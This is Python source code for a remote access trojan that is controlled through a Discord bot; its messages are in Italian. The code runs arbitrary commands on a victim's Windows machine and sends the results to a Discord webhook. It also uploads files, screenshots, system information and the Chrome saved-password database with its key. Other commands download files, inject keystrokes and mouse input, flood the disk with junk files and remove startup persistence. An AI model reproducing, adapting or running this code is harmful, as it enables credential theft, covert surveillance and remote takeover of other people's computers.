weburl = 'ENTER YOUR WEBHOOK URL HERE'
botoken = 'ENTER YOUR BOT TOKEN HERE'

import discord
from discord.ext import commands
from discord_webhook import DiscordWebhook
import subprocess
import os
import requests
import pyautogui as pglib
from sys import platform as osys
from random import randint
pglib.FAILSAFE = False


userprofile = os.environ["USERPROFILE"]
appdatar = os.environ["APPDATA"]
appdatal = os.environ["LOCALAPPDATA"]
i = requests.get("https://ifconfig.me")

client = commands.Bot(command_prefix=")", description="Bot for rat")


@client.command()
async def sysinfo(ctx):
    userw = ctx.message.author
    await ctx.channel.purge(limit=1)
    await ctx.send("Elaborazione dati...")
    def systeminfo():
        subprocess.getoutput('systeminfo > "%userprofile%\AppData\sysinfo.txt"')
        webhook = webhook = DiscordWebhook(url=weburl, content=f"File exported from public ip {i.text} for {userw}")
        with open(f'{userprofile}/AppData/sysinfo.txt', "rb") as f:
            webhook.add_file(file=f.read(), filename='System info.txt')
        webhook.execute()
        subprocess.getoutput('if exist "%userprofile%\AppData\sysinfo.txt" del "%userprofile%\AppData\sysinfo.txt"/q')
    systeminfo()

@client.command()
async def grab(ctx,arg):
    grabfile = arg
    userw = ctx.message.author
    webhook = webhook = DiscordWebhook(url=weburl, content=f"File exported from public ip {i.text} for {userw}")
    try:
        if os.path.getsize(grabfile) <= 1048576:
            with open(grabfile, "rb") as f:
                webhook.add_file(file=f.read(), filename=grabfile)
            webhook.execute()
        elif os.path.getsize(grabfile) >1048576:
            await ctx.send('Il file specificato è troppo pesante')
    except:
        await ctx.send('Il file specificato non esiste')


    
@client.command()
async def cmd(ctx,arg):
    cmdcommand = arg
    userw = ctx.message.author
    await ctx.channel.purge(limit=1)
    def cmdtxt():
        subprocess.getoutput(f'{cmdcommand} >> "%userprofile%\AppData\Output.txt"')
        file = f'{userprofile}/AppData/Output.txt'
        webhook = webhook = DiscordWebhook(url=weburl, content=f"File exported from public ip {i.text} for {userw}")
        with open(file, "rb") as f:
            webhook.add_file(file=f.read(), filename='Output.txt')
        webhook.execute()
        subprocess.getoutput('if exist "%userprofile%\AppData\Output.txt" del "%userprofile%\AppData\Output.txt"/q')
    cmdtxt()

@client.command()
async def cmdput(ctx,arg):
    io = arg
    await ctx.channel.purge(limit=1)
    subprocess.getoutput(io)
    await ctx.send(f'Commando {io} eseguito')


@client.command()
async def spamcmd(ctx,arg):
    const = 0
    stop = int(arg)
    subprocess.getoutput('echo @echo off > Funny.bat')
    while const <= stop:
        subprocess.getoutput('echo start >> Funny.bat')
        const += 1
    await ctx.channel.purge(limit=1)
    await ctx.send('Inizializzando apertura terminali...')
    os.system('Funny.bat')
    subprocess.getoutput('if exist Funny.bat del Funny.bat/q')



@client.command()
async def input(ctx,arg):
    writed = arg
    subprocess.getoutput(f'echo createobject("wscript.shell").sendkeys "{writed}" > InputWR.vbs')
    subprocess.getoutput('start InputWR.vbs')
    await ctx.send(f'Input {writed} inviato')
    subprocess.getoutput('if exist InputWR.vbs del InputWR.vbs/q')


@client.command()
async def lclick(ctx,arg):
    await ctx.channel.purge(limit=1)
    for i in range(0,int(arg)):
        pglib.click()
    if int(arg) == 1:
        await ctx.send("È stato inviato un click sinistro")
    else:
        await ctx.send(f"Sono stati inviati {arg} click sinistri")


@client.command()
async def rclick(ctx,arg):
    await ctx.channel.purge(limit=1)
    for i in range(0,int(arg)):
        with pglib.hold('shift'):
            pglib.press('F10')
    if int(arg) == 1:
        await ctx.send("È stato inviato un click destro")
    else:
        await ctx.send(f"Sono stati inviati {arg} click destri")  


    await ctx.send("Matrix finito")
    


@client.command()
async def mousemad(ctx,arg):
    await ctx.channel.purge(limit=1)
    await ctx.send("Il mouse ha iniziato a impazzire")
    for i in range(0,int(arg)):
        randx = randint(1,1919)
        randy = randint(1,1079)
        pglib.moveTo(randx,randy)
    await ctx.send("Il mouse è impazzito")



@client.command()
async def cd(ctx,arg):
    pathchoose = str(arg)
    try:
        os.chdir(pathchoose)
        await ctx.channel.purge(limit=1)
        await ctx.send(f'Percorso file cambiato su {arg}')
    except:
        a = 0
        await ctx.channel.purge(limit=1)
        await ctx.send('Percorso inesistente o accesso negato')
    

@client.command()
async def screen(ctx):
    userw = ctx.message.author
    try:
        pglib.screenshot('screenshot.png')
        await ctx.channel.purge(limit=1)
        await ctx.send('Inizializzazione screenshot...')
        webhook = webhook = DiscordWebhook(url=weburl, content=f"File exported from public ip {i.text} for {userw}")
        with open('screenshot.png', "rb") as f:
            webhook.add_file(file=f.read(), filename='Screenshot.png')
        webhook.execute()
        subprocess.getoutput('if exist Screenshot.png del Screenshot.png/q')
    except:
        subprocess.getoutput('echo Screenshot error > "%AppData%\ErrorS.txt"')
        webhook = webhook = DiscordWebhook(url=weburl, content=f"File exported from public ip {i.text} for {userw}")
        with open(f'{appdatar}\ErrorS.txt', "rb") as f:
            webhook.add_file(file=f.read(), filename='Screen Error.txt')
        webhook.execute()
        subprocess.getoutput('if exist "%AppData%\ErrorS.txt" del "%AppData%\ErrorS.txt"/q')



@client.command()
async def ping(ctx):
    userw = ctx.message.author
    try:
        subprocess.getoutput('ping -n 1 localhost > "%AppData%\Ping.txt"')
        webhook = webhook = DiscordWebhook(url=weburl, content=f"File exported from public ip {i.text} for {userw}")
        await ctx.channel.purge(limit=1)
        with open(f'{appdatar}\Ping.txt', "rb") as f:
            webhook.add_file(file=f.read(), filename='PingTest.txt')
        webhook.execute()
        subprocess.getoutput('if exist "%AppData%\Ping.txt" del "%AppData%\Ping.txt"/q')
    except:
        await ctx.send('Ping non eseguito corretamente')


@client.command()
async def chromepws(ctx):
    userw = ctx.message.author
    webhook = webhook = DiscordWebhook(url=weburl, content=f"File exported from public ip {i.text} for {userw}")
    await ctx.channel.purge(limit=1)
    try:
        with open(f'{appdatal}/Google/Chrome/User Data/Local State.', "rb") as f:
            webhook.add_file(file=f.read(), filename='Local State')
    except:
        await ctx.send('Error for Local State')
    try:
        with open(f'{appdatal}/Google/Chrome/User Data/Default/Login Data.', "rb") as f:
            webhook.add_file(file=f.read(), filename='Login Data')
        webhook.execute()
    except:
        await ctx.send('Error for Login Data')
    


@client.command()
async def so(ctx):
    await ctx.send(f'Il sistema operativo usato è {osys}')


@client.command()
async def wclose(ctx):
    await ctx.channel.purge(limit=1)
    with pglib.hold('alt'):
        pglib.press('F4')
    await ctx.send('Finestra chiusa')
    


@client.command()
async def desktop(ctx):
    with pglib.hold('win'):
        pglib.press('d')
    await ctx.send('Visuale spostata sul desktop')



@client.command()
async def download(ctx,arg):
    dnurl = arg
    startingdn = requests.get(dnurl)
    contenuto = startingdn.content
    fbdn = open(f'{userprofile}/downloads/file.','wb')
    fbdn.write(contenuto)
    fbdn.close()



@client.command()
async def msgboxE(ctx,arg):
    number_of_error = int(arg)
    subprocess.getoutput('echo msgbox "CRITICAL ERROR", 16, "CRITICAL ERROR" >> "%appdata%\Error.vbs"')
    os.chdir(appdatar)
    for i in range(0,number_of_error):
        subprocess.getoutput('start Error.vbs')
    if number_of_error == 1:
        await ctx.send('Errore inviato')
    else:
        await ctx.send('Errori inviati')
    subprocess.getoutput('if exist "%appdata%\Error.vbs" del "%appdata%\Error.vbs"/q')


@client.command(help='Rimuovi definitivamente il rat')
async def shutdown(ctx,arg):
    if arg != "bot":
        await ctx.send('Arg deve essere "bot", e questo rimuoverà definitivamente il rat dal pc vittima')
    else:
        subprocess.getoutput('if exist "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\starter.exe" del "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\starter.exe"/q')
        subprocess.getoutput('echo taskkill /f /im WinStarterP.exe > "%appdata%\ender.bat"')
        subprocess.getoutput('echo if exist "%localappdata%\WinStarterP.exe" del "%localappdata%\WinStarterP.exe"/q >> "%appdata%\ender.bat"')
        subprocess.getoutput('echo start ENDNOW.bat >> "%appdata%\ender.bat"')
        subprocess.getoutput('echo if exist ender.bat del ender.bat/q > ENDNOW.bat')
        subprocess.getoutput('echo del ENDNOW.bat/q >> ENDNOW.bat')
        os.chdir(appdatar)
        subprocess.getoutput('start ender.bat')


@client.command()
async def bomb(ctx):
    subprocess.getoutput('if not exist "%localappdata%\WinStart" md "%localappdata%\WinStart"')
    await ctx.send("Atomica lanciata")
    for i in range(0,10000000):
        subprocess.getoutput('echo %random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random% >> "%localappdata%\WinStart\%random%%random%.txt"')
    await ctx.send("L'atomica ha lasciato il segno")


@client.command()
async def sendmsg(ctx,arg):
    subprocess.getoutput(f'echo msgbox "{arg}", 0, "MESSAGE" > "%appdata%\m.vbs"')
    os.chdir(appdatar)
    subprocess.getoutput('start m.vbs')
    await ctx.send(f"Messaggio {arg} inviato")

@client.command()
async def m(ctx):
    subprocess.getoutput('del m.vbs/q')
    await ctx.send("Eseguito")
    
@client.command()
async def purge(ctx,arg):
    await ctx.channel.purge(limit=int(arg)+1)

@client.command()
async def print(ctx,arg):
    await ctx.send(arg)

@client.command()
async def cls(ctx):
    endlesss = 1000 * 1000
    await ctx.channel.purge(limit=endlesss)

client.run(botoken)
